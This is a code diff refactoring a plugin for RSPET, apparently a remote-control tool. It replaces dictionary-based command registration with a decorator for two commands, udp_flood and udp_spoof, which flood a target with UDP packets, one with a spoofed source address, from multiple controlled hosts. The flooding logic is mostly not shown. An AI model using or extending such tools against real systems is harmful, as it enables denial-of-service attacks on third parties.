@@ -3,30 +3,19 @@ Plug-in module for RSPET server. Offer functions related to udp flooding.
 """
 from __future__ import print_function
 from socket import error as sock_error
-from Plugins.mount import Plugin
+from Plugins.mount import Plugin, command
 
 class Files(Plugin):
     """
     Class expanding Plugin.
     """
-    __server_commands__ = {}
-    __cmd_help__ = {}
 
-    def __init__(self):
-        """
-        Declare plugin's CLI commands their syntax and their scope.
-        """
-        self.__server_commands__["UDP_Flood"] = [self.udp_flood, "connected",
-                                               "multiple"]
-        self.__cmd_help__["UDP_Flood"] =\
-        "UDP_Flood <target_ip> <target_port> [payload]"
-        self.__server_commands__["UDP_Spoof"] = [self.udp_spoof, "connected",
-                                               "multiple"]
-        self.__cmd_help__["UDP_Spoof"] =\
-        "UDP_Spoof <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]"
-
+    @command("connected", "multiple")
     def udp_flood(self, server, args):
-        """Flood target machine with UDP packets."""
+        """Flood target machine with UDP packets.
+
+        Help: <target_ip> <target_port> [payload]"""
+
         ret = [None,0,""]
         hosts = server.get_selected()
         if len(args) < 2:
@@ -49,8 +38,12 @@ class Files(Plugin):
                     ret[1] = 2 # Socket Error Code
         return ret
 
+    @command("connected", "multiple")
     def udp_spoof(self, server, args):
-        """Flood target machine with UDP packets via spoofed ip & port."""
+        """Flood target machine with UDP packets via spoofed ip & port.
+
+        Help: <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]"""
+
         ret = [None,0,""]
         hosts = server.get_selected()
         if len(args) < 4:
